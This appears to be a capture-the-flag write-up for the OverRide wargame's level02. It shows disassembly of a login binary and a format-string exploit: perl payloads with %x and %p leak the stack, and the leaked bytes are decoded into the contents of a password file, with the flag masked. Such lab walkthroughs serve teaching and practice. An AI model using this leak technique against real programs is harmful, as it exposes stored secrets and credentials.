In the disassembled code, we can see a few interesting things:

   0x00000000004009cd <+441>:   lea    -0x70(%rbp),%rax <==== Use this as a buffer for fgets
   0x00000000004009d1 <+445>:   mov    $0x64,%esi
   0x00000000004009d6 <+450>:   mov    %rax,%rdi
   0x00000000004009d9 <+453>:   callq  0x4006f0 <fgets@plt>
...
   0x0000000000400a96 <+642>:   lea    -0x70(%rbp),%rax <==== Use the same buffer for printf (This means string format exploitation is possible)
   0x0000000000400a9a <+646>:   mov    %rax,%rdi
   0x0000000000400a9d <+649>:   mov    $0x0,%eax
   0x0000000000400aa2 <+654>:   callq  0x4006c0 <printf@plt>

   0x0000000000400898 <+132>:   mov    $0x400bb0,%edx
   0x000000000040089d <+137>:   mov    $0x400bb2,%eax <==== This is the path to the file we want to open
   0x00000000004008a2 <+142>:   mov    %rdx,%rsi
   0x00000000004008a5 <+145>:   mov    %rax,%rdi
   0x00000000004008a8 <+148>:   callq  0x400700 <fopen@plt>

   0x00000000004008e6 <+210>:   lea    -0xa0(%rbp),%rax <==== This is the buffer for fread
   0x00000000004008ed <+217>:   mov    -0x8(%rbp),%rdx
   0x00000000004008f1 <+221>:   mov    %rdx,%rcx
   0x00000000004008f4 <+224>:   mov    $0x29,%edx
   0x00000000004008f9 <+229>:   mov    $0x1,%esi
   0x00000000004008fe <+234>:   mov    %rax,%rdi
   0x0000000000400901 <+237>:   callq  0x400690 <fread@plt>

(gdb) x/s 0x400bb2
0x400bb2:        "/home/users/level03/.pass"

We will start by trying to find the offset of the read buffer in the stack frame.

We can use the following script to find the offset of the read buffer:

perl -e 'print "aaaa" . "%x "x40' > /tmp/format_exploit

Then we can run the program and check the output:

level02@OverRide:~$ cat /tmp/format_exploit | ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: --[ Password: *****************************************
aaaaffffea10 0 20 2a2a2a2a 2a2a2a2a ffffec08 f7ff9a08 20782520 78252078 25207825 20 0 0 0 0
0 0 0 0 0 0 34376848 61733951 574e6758 6e475873 664b394d 0 61616161 78252078 25207825 20782520 78252078 does not have access!

We can see that our string "aaaa" starts to overwrite the stack frame at the 28th format string position.

There's a small catch with this exercise. Since we are on a 64-bit system, using %x doesn't print the full address. Instead, we can use %p.

perl -e 'print "aaaa" . "%p "x28' > /tmp/format_exploit

level02@OverRide:~$ cat /tmp/format_exploit | ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: --[ Password: *****************************************
aaaa0x7fffffffea10 (nil) (nil) 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffec08 0x1f7ff9a08 (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil)
(nil) (nil) (nil) (nil) 0x100000000 (nil) 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d
(nil) 0x2520702561616161  does not have access!

Here we can see the entire stack frame, including the read buffer (0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d)

We can now reverse the buffer (because of small endianness) and translate it to ascii to read the password file.

perl -e 'print "\x48\x68\x37\x34\x52\x50\x6e\x75\x51\x39\x73\x61\x35\x4a\x41\x45\x58\x67\x4e\x57\x43\x71\x7a\x37\x73\x58\x47\x6e\x68\x35\x4a\x35\x4d\x39\x4b\x66\x50\x67\x33\x48" . "\x0a"' > /tmp/password

level02@OverRide:~$ cat /tmp/password
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

This is the flag.
